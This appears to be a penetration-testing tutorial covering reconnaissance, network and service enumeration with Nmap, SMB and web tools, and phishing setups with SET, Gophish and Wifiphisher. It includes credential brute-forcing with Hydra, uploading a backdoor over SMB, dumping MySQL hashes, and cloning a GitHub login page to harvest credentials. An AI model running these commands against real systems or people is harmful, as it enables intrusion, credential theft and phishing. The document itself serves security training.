#### _**8. Run the Module**_

Once everything is set, you can execute the module to start the reconnaissance process.

- **Command:** run  This command runs the currently loaded module, initiating the reconnaissance process with the provided settings and options.
    

#### _**9. Show Hosts**_

After the module has been run, you can view the list of hosts that the module discovered.

- **Command:** show hosts  This command displays the list of hosts discovered by the module during its execution.
    

### **Reporting**

Recon-ng allows you to generate detailed reports from your reconnaissance data. You can customize the report format, metadata, and destination.

#### _**1. Use HTML Reporting Format**_

You can set the format for your reports, with HTML being a common choice for readability and sharing.

- **Command:** use reporting/html  This command sets the reporting format to **HTML**, which generates a clean and professional report ready for distribution.
    

#### _**2. Set Report Metadata**_

You can add custom metadata to your report, such as the creator’s name, customer name, and file path for saving the report.

- **Command:** set CREATOR "Miguel A. Carlo Morales"  Sets the creator’s name in the report’s metadata.
    
- **Command:** set CUSTOMER "EXAMPLE COMPANY"  Sets the customer’s name in the report’s metadata.
    
- **Command:** set FILENAME /root/kali/home/report_recon.html  Specifies the file path where the report will be saved.
    

#### _**3. Generate the Report**_

Once the metadata and format are set, you can generate the report.

- **Command:** run  This command generates the report with the configured metadata and format, saving it to the specified file path.
    

**Breach Data Tools**

1. **Have I Been Pwned (HIBP)**  Visit the **Have I Been Pwned** website to check if an email address or domain has been part of any known data breaches: [https://haveibeenpwned.com/](https://haveibeenpwned.com/ "https://haveibeenpwned.com/")
    
2. **PwnedOrNot GitHub Repository**  PwnedOrNot is a script that checks if an email address has been pwned using the Have I Been Pwned API. You can find the repository here: [https://github.com/thewhiteh4t/pwnedOrNot](https://github.com/thewhiteh4t/pwnedOrNot "https://github.com/thewhiteh4t/pwnedOrNot")
    
3. **Usage of PwnedOrNot Script**  To check if an email address is compromised in a data breach, run the following command: python3 pwnedornot.py -e user@example.com  This command checks if the email user@example.com has been involved in any known breaches using the PwnedOrNot script.
    
4. **Breach-Parse GitHub Repository**  Breach-Parse is a tool for parsing and analyzing data from breaches. You can find the repository here: [https://github.com/hmaverickadams/breach-parse](https://github.com/hmaverickadams/breach-parse "https://github.com/hmaverickadams/breach-parse")
    

These tools and resources are vital for conducting thorough reconnaissance, vulnerability assessments, and gathering intelligence for security audits, bug bounty hunting, and penetration testing engagements.

### **Enumeration Tutorial**

This tutorial provides a comprehensive guide for performing network enumeration using tools like **Netdiscover**, **Nmap**, **Metasploit**, and others. Each command is explained in detail to ensure clarity and professionalism.

### **Netdiscover**

Netdiscover is a tool used for discovering hosts on a network through ARP requests. Use it to identify live hosts and gather IP address information.

To discover hosts in a network:

sudo netdiscover -i eth0 -r 192.167.56.0/24

- -i eth0 specifies the network interface to use.
    
- -r defines the IP range to scan (in this case, 192.167.56.0/24).
    

### **Nmap**

Nmap is a powerful network scanning tool that allows you to discover hosts, services, and vulnerabilities in your network. Below is a categorized list of Nmap commands for different scanning purposes.

#### _**General Scanning**_

- **Ping Sweep** (Detect active hosts in the network):
    
- nmap -sP 172.16.0.0/24 >> ping_sweep
    
- **Full Connect Scan** (Simple TCP connect scan):
    
- nmap -sT 192.168.161.129
    
- **Port Selection** (Scan a specific port, e.g., RDP on port 3389):
    
- nmap -sT 172.16.90.0/24 -p 3389
    
- **SYN Scan** (Stealth scan using SYN packets):
    
- nmap -sS 172.16.90.19
    

#### _**Service and OS Identification**_

- **Service Identification** (Identify services running on open ports):
    
- nmap -sV 192.168.161.129
    
- **OS Fingerprinting** (Detect the operating system):
    
- nmap -sS -O 192.168.161.129
    
- **Disable Ping** (Skip host discovery):
    
- nmap -sS -Pn 172.16.90.0/24
    

#### _**UDP and Target Input Scans**_

- **UDP Scanning** (Scan for open UDP ports):
    
- nmap -sU 192.168.161.129
    
- **Target Input File** (Scan from a list of IP addresses):
    
- nmap -sS -iL ip_address.txt
    

#### _**Timing and Verbosity**_

- **Timing Sneaky** (Slow scan to avoid detection):
    
- nmap -sS -T0 192.168.161.129
    
- **Verbose Scan** (Increase verbosity for more detailed output):
    
- nmap -Pn -F -sV -O scanme.org -v
    

#### _**Specialized Scripts**_

- **SMB Enumeration** (Enumerate users, shares, and services on an SMB server):
    
- nmap --script smb-enum-users.nse 192.168.99.145
    
- nmap --script smb-enum-groups.nse 192.168.99.145
    
- nmap --script smb-enum-shares.nse 192.168.99.145
    
- nmap --script smb-enum-services.nse 192.168.99.145
    
- **HTTP Enumeration** (Enumerate HTTP services and information):
    
- nmap --script http-enum.nse 192.168.99.145
    
- **SMB Script Scan on Port 445**:
    
- nmap --script -p445 smb* 192.168.56.101
    
- **Target Sniffer** (Sniff traffic on specific interfaces and report new targets):
    
- nmap --script=targets-sniffer --script-args-newtargets.targets-sniffer,targets-sniffer.timeout=60s,targets-sniffer.iface=eth0
    

#### _**Post-scan Processing**_

- **Update Scripts** (Update Nmap scripts database):
    
- nmap --script-updatedb
    
- **XML to HTML Conversion** (Convert scan results from XML to a more readable HTML format):
    
- nmap -sS -n -T4 192.168.161.129 -oX metasploit.xml
    
- xsltproc metasploit.xml -o output.html
    
- **Sort and Filter Results** (Filter and sort results based on specific criteria):
    
- nmap -sn -n --send-ip 172.16.90.0/24 | grep ^Nmap | grep -v seconds | cut -d " " -f 5 | sort
    

### **CVE Scanning with Nmap**

This section outlines the steps for scanning for **Common Vulnerabilities and Exposures** (CVEs) using Nmap’s scripting engine and external databases.

#### _**Initial Setup**_

1. Navigate to the Nmap scripts directory:
    
2. cd /usr/share/nmap/scripts/
    
3. Clone the necessary repositories for CVE scanning:
    
4. sudo git clone https://github.com/vulnersCom/nmap-vulners.git
    
5. sudo git clone https://github.com/scipag/vulscan.git
    

#### _**Running CVE Scans**_

- **Scan with nmap-vulners** (Scan for vulnerabilities using Vulners database):
    
- sudo nmap --script nmap-vulners/ -sV 192.168.56.105
    
- **Scan with Vulscan** (Scan using the Vulscan script with an exploit database):
    
- sudo nmap --script vulscan/ --script-args vulscandb=exploitdb.csv -sV 192.168.56.105
    

#### _**Updating Vulscan**_

To ensure Vulscan is up-to-date:

1. Navigate to the Vulscan updater directory:
    
2. cd /usr/share/nmap/scripts/vulscan/utilities/updater
    
3. Make the update script executable:
    
4. chmod +x updateFiles.sh
    
5. Run the update script:
    
6. ./updateFiles.sh
    

#### _**Additional CVE Scanning Commands**_

- **Nmap-vulners on port 22**:
    
- nmap --script nmap-vulners -sV -p 22 192.168.56.105
    
- **Vulscan on port 22**:
    
- nmap --script vulscan -sV -p22 192.168.56.105
    
- **Vulscan with custom database on port 3306 (MySQL)**:
    
- nmap --script nmap-vulners/ --script-args vulscandb=database_name -sV -p3306 192.168.56.105
    
- **Vulscan on port 80 with SCIP database**:
    
- nmap --script /usr/share/nmap/scripts/vulscan/ --script-args vulscandb=scipvuldb.csv -sV -p80 192.168.56.105
    
- **Vulscan on port 445 (SMB)**:
    
- nmap --script /usr/share/nmap/scripts/vulscan/ --script-args vulscandb=exploitdb.csv -sV -p445 192.168.56.105
    

### **Additional Scanning Tools**

#### _**Hping3**_

Hping3 is a network tool used to craft custom TCP/IP packets. It can be used for network diagnostics, firewalls, and security testing.

Example: Send 3 SYN packets to port 53 of example.com:

hping3 -c 3 -p 53 -S example.com

#### _**Banner Grabbing with Netcat**_

Netcat (nc) is a versatile tool that can be used for banner grabbing by connecting to a service on a specified port.

Example: Grab the banner of a service running on port 80:

nc -v 192.168.56.103 80

- **Connect to port 21 (FTP) of a target**: nc 192.168.56.101 21
    

### **Masscan**

**Masscan** is an extremely fast port scanner that is capable of scanning entire IP ranges in a fraction of the time it would take other tools. It is designed to handle very high-speed network scans, making it useful for large-scale enumeration. Below is an example of how to use Masscan for fast port scanning:

- **Scan all ports (0-65535) on a target IP with a rate limit of 100,000 packets per second**:
    
- masscan 192.168.56.101 -p0-65535 --max-rate 100000
    

- -p0-65535: Specifies the port range to scan (from 0 to 65535).
    
- --max-rate 100000: Limits the packet sending rate to 100,000 packets per second to avoid network congestion.
    

Masscan is incredibly efficient for large-scale scanning tasks, and it can be combined with other tools like Nmap for deeper reconnaissance after performing a fast initial scan.

### **Web Enumeration**

Web enumeration involves using specialized tools to discover vulnerabilities, misconfigurations, and weaknesses in web applications and services. This section covers tools such as **Nikto**, **Wpscan**, **Dirb**, and **Gobuster**. Each tool is detailed below, providing practical commands and usage scenarios for effective web enumeration.

#### _**Web Enumeration Basics**_

Before performing web enumeration, you may want to target a vulnerable web application. You can access a commonly used resource for testing purposes:

- **Website**: Vulnerable Web Apps
    
- **Credentials**:
    
- **Username**: va or root
    
- **Password**: vulnerablewebapps
    

### **Nikto**

**Nikto** is a powerful open-source web server scanner designed to identify various security issues, including potential vulnerabilities, outdated software versions, and misconfigurations.

#### _**Example Commands:**_

- **Local Network Scan** (Scan a local web server):
    
- nikto -h http://192.168.161.129
    
- **Scan Specific Paths** (Target specific application paths):
    
- nikto -h http://172.16.130.130/bWAPP
    
- nikto -h http://172.16.130.130/bWAPP/apps/
    
- **Scan with Plugins** (Use specific Nikto plugins to scan for particular issues):
    
- nikto -Plugins "robots(nocheck)" -h http://172.16.130.130/bWAPP
    
- nikto -Plugins robots -h http://172.16.130.130/bWAPP
    
- **HTTPS Scanning** (Scan an HTTPS web server):
    
- nikto -h http://192.168.161.129 -ssl
    
- **Scan a Specific Port** (Scan a non-standard port):
    
- nikto -h http://192.168.161.129 -port 8080
    
- **Save Output to a File** (Store scan results in a file for later analysis):
    
- nikto -h http://192.168.161.129 -output /home/mcarlo/nikto_scan.txt
    
- **Use Proxychains4** (Route traffic through a proxy for anonymity):
    
- nikto -h http://192.168.161.129 -useproxy proxy.ip.address.here
    
- **Authentication Scan** (Scan a protected web page with authentication credentials):
    
- nikto -h http://192.168.161.129 -id username:password
    
- **Ignore Specific HTTP Codes** (Avoid scanning specific HTTP status codes):
    
- nikto -h http://192.168.161.129 -IgnoreCode 301
    
- **Limit Maximum Scan Time** (Limit the duration of the scan):
    
- nikto -h http://192.168.161.129 -maxtime number.of.seconds
    
- **Disable Response Cache** (Avoid using cached results):
    
- nikto -h http://192.168.161.129 -nocache
    
- **Update Nikto** (Update the Nikto database to ensure you are scanning for the latest vulnerabilities):
    
- nikto -update
    
- **DNS Scan** (Perform a DNS scan):
    
- nikto -h http://www.pr.gov
    
- **Generate HTML Report** (Generate an HTML report for better readability):
    
- nikto -h http://192.168.161.129 -Format htm -o report.htm
    

### **Wpscan**

**Wpscan** is a specialized tool for scanning WordPress websites to identify vulnerabilities in plugins, themes, users, and configurations.

#### _**Example Commands:**_

- **Enumerate Vulnerable Plugins and Themes** (Scan for known vulnerable plugins and themes):
    
- wpscan --url http://192.168.56.101/8585/wordpress --enumerate vp vt
    
- **Enumerate Users** (Find user accounts on the WordPress site):
    
- wpscan --url http://192.168.56.101/ --enumerate u
    
- **Enumerate Users in a Range** (Enumerate users from ID 1 to 100):
    
- wpscan --url http://192.168.56.101/ --enumerate u1-100
    
- **Use a Random User-Agent** (To avoid detection, use a randomized user-agent):
    
- wpscan --url http://example.com/ --random-user-agent
    
- **Scan with API Token** (Use an API token to access additional vulnerability information):
    
- wpscan --url http://example.com/ -e api-token YOUR_TOKEN
    
- wpscan --url http://example.com/ -e vt --api-token YOUR_TOKEN
    
- **Scan for Users** (Identify user accounts on a WordPress website):
    
- wpscan --url http://example.com -e u
    

### **Dirb**

**Dirb** is a web content scanner used for brute-forcing directories and files on a web server. It helps identify hidden resources such as admin panels, configuration files, or backup files.

#### _**Example Command:**_

- **Directory Brute-forcing** (Brute-force directories on a specific URL using a wordlist):
    
- dirb http://192.168.56.103:8585/wordpress /usr/share/wordlist/dirb/big.txt
    
- /usr/share/wordlist/dirb/big.txt: Path to a wordlist file containing common directory names.
    

### **Gobuster**

**Gobuster** is another tool for brute-forcing directories and files. It is faster than Dirb in certain situations due to its concurrency features.

#### _**Example Commands:**_

- **Basic Directory Brute-forcing** (Brute-force directories on a URL using a wordlist):
    
- gobuster dir -u http://192.168.161.129 -w common.txt
    
- **Filter Specific Status Codes** (Filter results by HTTP status codes, such as 200, 301, and 403):
    
- gobuster dir -u http://192.168.161.129 -s '200,204,301,307,403,500' -w common.txt
    

### **Conclusion**

These tools provide a robust and comprehensive approach to **web enumeration**. When conducting web application security testing, always ensure you have **proper authorization** from the owner of the target web application. Unauthorized scanning of websites can be illegal and harmful.

### **SMB Enumeration**

SMB (Server Message Block) is a network file sharing protocol commonly used in Windows environments. This guide provides a detailed overview of SMB enumeration techniques using various tools such as **Nmap**, **SMBMap**, **Metasploit**, **Nmblookup**, **Smbclient**, **Rpcclient**, and **Enum4linux**. Each tool plays a key role in identifying vulnerabilities, accessing shares, and gathering information about SMB services on target systems.

### **Nmap for SMB Enumeration**

**Nmap** is a powerful open-source tool used for network discovery and security auditing. When combined with scripts, it becomes an excellent tool for enumerating SMB services. Here are some key Nmap commands for SMB enumeration:

- **Show only open ports** (Scan a subnet and display only open ports):
    
- nmap -T4 --open 192.168.56.0/24
    
- **Show ports, service names, and attempt to guess the OS** (Detect open ports, services, and guess the target's operating system):
    
- nmap -sV -O 192.168.56.105
    
- **Run default scripts** (Use Nmap's default scripts to scan for vulnerabilities and gather information):
    
- nmap -sV -sC 192.168.56.105
    
- **SMB Protocol and Security Mode Enumeration** (Check the SMB protocol versions and security modes):
    
- nmap -p445 --script smb-protocols 192.168.56.105
    
- nmap -p445 --script smb-security-mode 192.168.56.105
    
- **Enumerate Sessions, Shares, Users, and Other Information** (Use SMB enumeration scripts to gather more details):
    
- nmap -p445 --script smb-enum-sessions 192.168.56.105
    
- nmap -p445 --script smb-enum-shares 192.168.56.105 --script-args smbusername=administrator,smbpassword=password
    
- nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=password 192.168.56.105
    
- **Other SMB Scripts** (Use additional scripts to enumerate domains, groups, and services):
    
- nmap -p445 --script smb-enum-domains,smb-enum-groups,smb-enum-services --script-args smbusername=administrator,smbpassword=password 192.168.56.105
    
- nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=password 192.168.56.105
    

Nmap provides a powerful way to discover SMB-related information and vulnerabilities through scripts and service version detection.

### **SMBMap**

**SMBMap** is a command-line tool that allows users to enumerate SMB shares, perform file operations, and interact with remote systems via SMB. It is particularly useful for analyzing SMB file shares on remote machines.

- **Basic Usage** (Enumerate SMB shares as a guest or authenticated user):
    
- smbmap -u guest -p "" -d . -H 192.168.56.105
    
- smbmap -u administrator -p password -d . -H 192.168.56.105
    
- **Execute a Command** (Run a command on the remote SMB server):
    
- smbmap -u administrator -p password -d . -H 192.168.56.105 -x 'ipconfig'
    
- **List Content** (List the contents of shared directories):
    
- smbmap -u administrator -p password -d . -H 192.168.56.105 -L
    
- **Read/Write Operations** (Perform file operations like reading, writing, and uploading files):
    
- smbmap -u administrator -p password -d . -H 192.168.56.105 -r 'C$'
    
- smbmap -u administrator -p password -d . -H 192.168.56.105 --upload '/home/kali/backdoor' 'C$\backdoor'
    
- smbmap -u administrator -p password -d . -H 192.168.56.105 --download 'C$\flag.txt'
    

SMBMap is an invaluable tool for SMB share enumeration and performing read/write operations on shares with valid credentials.

### **SMB with Metasploit**

**Metasploit** is a widely used framework for penetration testing. It includes several auxiliary modules designed for SMB enumeration and exploitation.

- **Using Metasploit for SMB Enumeration**:
    

1. Launch Metasploit:
    
2. msfconsole
    
3. Use the SMB version scanner:
    
4. use auxiliary/scanner/smb/smb_version
    
5. set rhosts 192.168.56.105
    
6. run
    

This module helps identify the SMB version running on the target system and can provide further details about the SMB service.

### **Nmblookup**

**Nmblookup** is a tool for querying NetBIOS names over the network. It is helpful for identifying machines and obtaining information about SMB services.

- **Query NetBIOS Names** (Lookup a target system's NetBIOS name):
    
- nmblookup -A 192.168.56.105
    

This can help identify the target system and the available shares by querying its NetBIOS name.

### **Smbclient**

**Smbclient** is a command-line tool used to access and interact with SMB shares. It allows users to list shares, transfer files, and access remote systems.

- **List SMB Shares** (List the available shares on a target system):
    
- smbclient -L 192.168.56.105 -N
    
- **Access SMB Shares** (Access a particular share on a target system):
    
- smbclient \\192.168.56.101
    
- smbclient \\192.168.56.101\tmp
    

Smbclient can be useful for interacting directly with SMB shares, performing file operations, and accessing remote resources.

### **Rpcclient**

**Rpcclient** is a tool that allows interaction with Windows RPC services. It can be used to query user information, share enumeration, and more.

- **Perform Various Operations** (Execute commands like user enumeration and share listing):
    
- rpcclient -U "" -N 192.168.56.105
    
- querydominfo
    
- enumdomusers
    
- queryuser msfadmin
    
- netshareenum
    

These commands allow you to enumerate users, shares, and domain information via the Windows RPC service.

### **Enum4linux**

**Enum4linux** is a Linux tool for gathering information from Windows systems via SMB. It performs similar functions to the Windows tool enum.exe, enabling you to extract various SMB-related details from remote systems.

- **Example Command** (Use Enum4linux to gather information from a Windows machine via SMB):
    
- enum4linux -a 192.168.56.105
    
- **Verbose Mode**:
    
- enum4linux -v 192.168.56.104
    
- **Run All Options**:
    
- enum4linux -a 192.168.56.104
    
- **With Credentials**:
    
- enum4linux -u administrator -p password -U 192.168.56.104
    
- **Pull Usernames from RID Ranges**:
    
- enum4linux -r 192.168.56.104
    
- enum4linux -R 600-660 192.168.56.104
    
- **List Groups and Shares**:
    
- enum4linux -G 192.168.56.104
    
- enum4linux -s 192.168.56.104
    
- **Directory Attack and OS Information**:
    
- enum4linux -s shares.txt 192.168.56.104
    
- enum4linux -o 192.168.56.104
    
- **Printer Information**:
    
- enum4linux -i 192.168.56.104
    

### **Conclusion**

SMB enumeration is a critical part of network reconnaissance, especially in Windows environments. Tools like **Nmap**, **SMBMap**, **Metasploit**, **Nmblookup**, **Smbclient**, **Rpcclient**, and **Enum4linux** are essential for gathering valuable information, identifying vulnerabilities, and assessing the security of SMB services on target systems. As always, ensure you have proper authorization before conducting any enumeration activities on a network. Unauthorized access to systems or services may be illegal.

### **FTP (File Transfer Protocol) Enumeration and Exploitation**

FTP is one of the most widely used protocols for transferring files over the network. Enumeration and exploitation of FTP services are crucial for identifying vulnerabilities such as weak credentials and open anonymous access.

#### _**FTP Service Scan**_

To begin, we can scan the FTP service on a target using Nmap to detect open ports and gather service version details.

nmap -p 21 -sV -O 192.168.56.106

This command scans port 21 (default FTP port), performs version detection (-sV), and attempts to identify the target’s operating system (-O).

#### _**Brute-Forcing FTP Credentials with Hydra**_

Hydra is a popular tool for brute-forcing login credentials. Below is an example of using Hydra to perform a brute-force attack on FTP.

hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.56.106 ftp

- **-L** specifies the user list.
    
- **-P** specifies the password list.
    

#### _**Access FTP Using Found Credentials**_

Once valid credentials are identified, access the FTP server using the ftp command.

ftp 192.168.56.106

Then, execute FTP commands to interact with the server:

- **List files**:
    
- ls
    
- **Download a file**:
    
- get secret.txt
    
- **Exit the FTP session**:
    
- bye
    

#### _**Create User List for Brute-Force**_

Create a custom user list for Hydra by echoing usernames into a file:

echo "msfadmin" > users

#### _**Use Nmap FTP Scripts**_

Nmap has built-in scripts for brute-forcing FTP credentials and checking for anonymous login.

- **FTP Brute-Force**:
    
- nmap --script ftp-brute --script-args userdb=/home/kali/users -p 21 192.168.56.106
    
- **FTP Anonymous Login**:
    
- nmap -p21 --script ftp-anon 192.168.56.106
    

### **SSH (Secure Shell) Enumeration and Exploitation**

SSH is commonly used for remote administration of servers. By enumerating the SSH service, you can identify weak authentication methods or vulnerable configurations.

#### _**Scan SSH Service**_

To scan for SSH service and obtain information about its version and configuration:

nmap -p22 -sV -O 192.168.56.106

#### _**Login to SSH**_

To manually test SSH access, use the ssh command with the identified credentials.

ssh msfadmin@192.168.56.106

Alternatively, test SSH connectivity using nc (Netcat) to verify if the port is open.

nc 192.168.56.106 22

#### _**Use Nmap SSH Scripts**_

Nmap provides several scripts that can be useful for enumerating SSH-related information.

- **SSH Algorithm Enumeration**:
    
- nmap -p22 --script ssh2-enum-algos 192.168.56.106
    
- **SSH Host Key Enumeration**:
    
- nmap -p22 --script ssh-hostkey --script-args ssh_hostkey=full 192.168.56.106
    
- **SSH Authentication Methods**:
    
- nmap -p22 --script ssh-auth-methods --script-args="ssh.user=msfadmin" 192.168.56.106
    

#### _**Brute-Forcing SSH with Hydra**_

Brute-force SSH credentials using Hydra by specifying a username and password list:

hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.56.106 ssh

#### _**Metasploit for SSH Enumeration**_

Metasploit can also be used to brute-force SSH credentials. The following steps describe how to use Metasploit for SSH login attempts.

1. Start Metasploit:
    
2. msfconsole
    
3. Use the SSH login auxiliary module:
    
4. use auxiliary/scanner/ssh/ssh_login
    
5. set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
    
6. set STOP_ON_SUCCESS true
    
7. set verbose true
    
8. run
    

### **HTTP (Hypertext Transfer Protocol) Enumeration and Exploitation**

HTTP is the protocol used by web servers to communicate with clients. Scanning HTTP services can reveal important information about the web server and its associated technologies.

#### _**Scan HTTP Service**_

To scan HTTP services and detect versions:

nmap -sV -O 192.168.56.105

#### _**Identify Web Technologies**_

The whatweb tool identifies web technologies (e.g., CMS, server software):

whatweb 192.168.56.105

Alternatively, use httpx for a quick and comprehensive HTTP scan:

httpx http://192.168.56.105

#### _**Directory Enumeration**_

Use tools like dirb for brute-forcing directories on the target web server:

dirb http://192.168.56.105

#### _**Nmap HTTP Scripts**_

Nmap provides various HTTP-related scripts to enumerate directories, methods, and more:

- **HTTP Enumeration**:
    
- nmap -p80 -sV --script http-enum 192.168.56.105
    
- **HTTP Header Enumeration**:
    
- nmap -p80 -sV --script http-headers 192.168.56.105
    
- **HTTP Method Enumeration**:
    
- nmap -p80 -sV --script http-methods --script-args http-methods.url-path=/webdav/ 192.168.56.105
    
- **WebDAV Scan**:
    
- nmap -p80 -sV --script http-webdav-scan --script-args http-methods.url-path=/webdav/ 192.168.56.105
    

#### _**Metasploit for HTTP Scanning**_

Metasploit can be used for scanning HTTP services and enumerating versions.

1. Start Metasploit:
    
2. msfconsole
    
3. Use the HTTP version scanner:
    
4. use auxiliary/scanner/http/http_version
    
5. set rhosts 192.168.56.106
    
6. run
    

#### _**Additional Tools for HTTP Interaction**_

Here are some additional tools that can help interact with and test web servers:

- **cURL**:
    
- curl http://192.168.56.106 | more
    
- **wget**:
    
- wget "http://192.168.56.106/index"
    
- **Browsh**:
    
- browsh --startup-url 192.168.56.106
    
- **Lynx** (Text-based browser):
    
- lynx http://192.168.56.106
    

#### _**Directory Brute Force with Metasploit**_

Use Metasploit for directory brute-forcing:

1. Start Metasploit:
    
2. msfconsole
    
3. Use the HTTP directory brute-force module:
    
4. use auxiliary/scanner/http/brute_dirs
    
5. set rhosts 192.168.56.106
    
6. exploit
    

Alternatively, you can use dirb for directory brute-forcing:

dirb http://192.168.56.106

#### _**Scan CGI Directories**_

Use Metasploit for scanning CGI directories and interacting with robots.txt:

1. Start Metasploit:
    
2. msfconsole
    
3. Use the robots.txt scanner:
    
4. use auxiliary/scanner/http/robots_txt
    
5. set rhosts 192.168.56.106
    
6. run
    
7. Access CGI directories using curl:
    
8. curl http://192.168.56.106/cgi-bin/ | more
    

### **MySQL Enumeration and Exploitation**

MySQL is a popular database management system. Enumerating MySQL services can reveal valuable information, such as databases and user privileges.

#### _**Scan MySQL Service**_

To scan for open MySQL services and detect versions:

nmap -p3306 -sV 192.168.56.107

#### _**Login to MySQL**_

You can manually log in to MySQL using the following command:

mysql -h 192.168.56.107 -u root

Once logged in, use SQL commands to interact with the database:

- **Show databases**:
    
- show databases;
    
- **Use a specific database**:
    
- use books;
    
- **Query the database**:
    
- select count(*) from authors;
    

#### _**Metasploit for MySQL Enumeration**_

Metasploit offers auxiliary modules for MySQL enumeration:

- **Writable Directories Enumeration**:
    
- msfconsole
    
- use auxiliary/scanner/mysql/mysql_writable_dirs
    
- set dir_list /usr/share/metasploit-framework/data/wordlists/dangerzone_a.txt
    
- setg rhosts 192.168.56.106
    
- set verbose false
    
- run
    
- **MySQL Hash Dump**:
    
- msfconsole
    
- use auxiliary/scanner/mysql/mysql_hashdump
    
- set username root
    
- set
    

password "" exploit

#### **Use Nmap MySQL Scripts**

Nmap offers several scripts for enumerating MySQL services:

- **Empty Password Check**:

```bash

nmap -p3306 -sV --script=mysql-empty-password 192.168.56.106

- **MySQL User Enumeration**:
    
- nmap -p3306 -sV --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" 192.168.56.106
    
- **MySQL Databases Enumeration**:
    
- nmap -p3306 -sV --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" 192.168.56.106
    

#### _**Brute-Force MySQL with Hydra**_

Use Hydra to brute-force MySQL login credentials:

hydra -l msfadmin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.56.106 mysql

### **MS-SQL Enumeration and Exploitation**

MS-SQL is Microsoft's SQL Server, and scanning for vulnerabilities can help identify potential attack vectors.

#### _**Scan MS-SQL Service**_

To scan MS-SQL services, use the following Nmap command:

nmap -p1433 --script ms-sql-info 192.168.56.105

#### _**MS-SQL Brute Force with Nmap**_

To brute-force MS-SQL logins, use Nmap with the ms-sql-brute script:

nmap -p1433 --script ms-sql-brute --script-args userdb=/usr/share/metasploit-framework/data/wordlists/unix_users.txt,passdb=/usr/share/wordlists/rockyou.txt 192.168.56.105

This command uses a user and password list to perform the brute-force attack.

### **Social Engineering Toolkit (SET) Tutorial**

The **Social Engineering Toolkit (SET)** is a powerful framework designed to facilitate social engineering attacks, especially phishing, and automate the process of targeting users. Below is a guide to help you understand and utilize SET effectively.

#### _**1. PhishInsight**_

To start, you can use **PhishInsight**, a free platform from TrendMicro for phishing simulation and analysis. Simply create an account to gain access.

#### _**2. Social-Engineering Toolkit (SET) Setup**_

**Installation:** To install the Social Engineering Toolkit (SET) on your system, run the following command:

apt install setoolkit

**Menu Overview:** SET provides several menu options to carry out different social engineering attacks:

1. **Social-Engineering Attacks**: Targeting victims through various social engineering methods.
    
2. **Website Attack Vectors**: Leveraging vulnerabilities in websites.
    
3. **Credential Harvester Attack Method**: Collecting login credentials from a cloned website.
    
4. **Site Cloner**: Cloning websites for phishing.
    

#### _**3. Attacks in Social Engineering Toolkit (SET)**_

**Credential Harvester / Tabnabbing:** This attack method can be used to collect credentials by cloning a website and setting it up to capture user input.

1. **Clone Website**:
    

- Enter the **IP address** for POST back (i.e., where the credentials will be sent): 192.168.56.102
    
- Clone a popular website like GitHub’s login page by typing the URL: set:webattack > Enter the URL to clone: https://github.com/login
    

1. **Return to Main Menu**: You can always return to the main menu by selecting option 99.
    

#### _**4. Mass Mailer Attack**_

1. **Send Phishing Email to a Single Address**:
    

- From the **SET Menu**, choose the mass mailer option for email phishing.
    
- Enter the email address to send the phishing message to: set:phishing > Send email to: user@example.com
    

1. **Use Your Own Email Server**:
    

- SET allows you to send phishing emails using your own mail server or an open relay.
    

#### _**5. Wifiphisher - Pharming Attack**_

**Wifiphisher** is a tool designed for phishing attacks over wireless networks. It supports several phishing techniques, including fake Wi-Fi access points.

**Command to Initiate Pharming:**

wifiphisher --essid "FREE-WiFi" -p oauth-login -KB

This command creates a fake Wi-Fi access point to lure users into providing their credentials.

#### _**6. Shellphish - OAuth Phishing**_

**Shellphish** is a tool to simulate OAuth phishing attacks. It targets services like Google, Facebook, and others to trick users into providing their login information.

**Installation:**

git clone https://github.com/AbirHasan2005/ShellPhish.git

cd ShellPhish

bash shellphish.sh

**Steps:**

1. Choose **Option 05** for OAuth phishing.
    
2. Select **Option 02** for relevant port forwarding, if necessary.
    

#### _**7. Gophish Setup**_

**Gophish** is another phishing framework used for creating and sending phishing emails.

1. **Install Golang** (Required for Gophish):
    
2. sudo apt install golang
    

3. **Set Up Golang Workspace**:
    
4. mkdir /home/kali/go-workspace
    
5. **Configure Bashrc**:
    
6. nano ~/.bashrc
    
7. # Add the following GO paths:
    
8. export GOPATH=/home/kali/go-workspace
    
9. export GOROOT=/usr/bin/go
    
10. export PATH=$PATH:$GOROOT/bin:$GOPATH/bin
    
11. source ~/.bashrc
    
12. **Clone and Build Gophish**:
    
13. cd /home/kali/go-workspace
    
14. git clone https://github.com/gophish/gophish.git
    
15. cd gophish
    
16. go build
    
17. **Start Gophish**:
    
18. ./gophish
    
19. **Access the Dashboard**: Open your browser and navigate to: https://127.0.0.1:3333.
    
20. **Create a New Profile**: Navigate to **Dashboard → Sending Profile → New Profile**. Configure the profile, then save it.
    

#### _**8. Nmap Scan for Service Detection**_

Use **Nmap** to scan a target for web services or vulnerabilities:

sudo nmap -p80,443 -sV --script=http-enum 192.168.56.104

This command checks for services running on ports 80 and 443 and runs HTTP-related enumeration scripts.

#### _**9. Import and Redirect Site**_

1. **Import Website**:
    

- Import the site: https://192.168.56.104/mail
    

1. **Redirect to New Site**:
    

- Redirect it to: http://192.168.45.104/mail.
    

#### _**10. Save Page and Templates in Gophish**_

After importing the site and customizing it, save the page and templates to use in your phishing campaigns.

**Launch a Campaign** by configuring a new campaign using the saved templates.

#### _**11. BeEF (Browser Exploitation Framework)**_

**BeEF** is a powerful tool that allows you to exploit vulnerabilities in web browsers, gaining control over compromised systems.

#### _**12. PwnDrop Setup**_

**PwnDrop** is a file dropper tool that allows you to transfer files to compromised systems.

**Installation**:

sudo git clone https://github.com/kgretzky/pwndrop.git

tar zxvf pwndrop-linux-amd.tar.gz

cd pwndrop

./pwndrop stop

./pwndrop install

./pwndrop start

./pwndrop status

**Access PwnDrop**: Navigate to https://127.0.0.1/pwndrop.

#### _**13. Transferring Files Using SMB and SCP**_

**SMB Setup**:

1. **Start Samba Services**:
    
2. sudo systemctl start smbd.service
    
3. sudo systemctl start nmbd.service
    
4. **Set Samba Password**:
    
5. smbpasswd -a kali
    
6. **Configure Samba Share**: Edit /etc/samba/smb.conf to add a new shared folder:
    
7. [share]
    
8. path = /home/kali/payloads
    
9. browseable = yes
    
